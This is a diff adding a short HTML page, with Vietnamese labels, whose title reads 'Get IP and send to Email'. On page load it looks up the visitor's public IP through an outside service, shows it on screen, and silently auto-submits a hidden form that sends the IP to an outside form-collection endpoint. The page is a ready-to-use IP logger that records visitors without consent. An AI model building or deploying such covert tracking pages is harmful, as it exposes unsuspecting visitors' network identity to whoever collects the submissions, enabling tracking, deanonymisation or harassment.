@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lấy IP và gửi về Email</title>
+</head>
+<body>
+  <h2>Lấy IP công khai</h2>
+  <p id="status">Đang xử lý...</p>
+
+  <form id="ipForm" action="https://formspree.io/f/xovwnjya" method="POST" style="display:none;">
+    <input type="hidden" name="ip" id="ipInput">
+  </form>
+
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById('ipInput').value = data.ip;
+        document.getElementById('status').textContent = "IP của bạn: " + data.ip;
+
+        // Tự động gửi form
+        document.getElementById('ipForm').submit();
+      })
+      .catch(err => {
+        document.getElementById('status').textContent = "Không thể lấy IP.";
+        console.error(err);
+      });
+  </script>
+</body>
+</html>
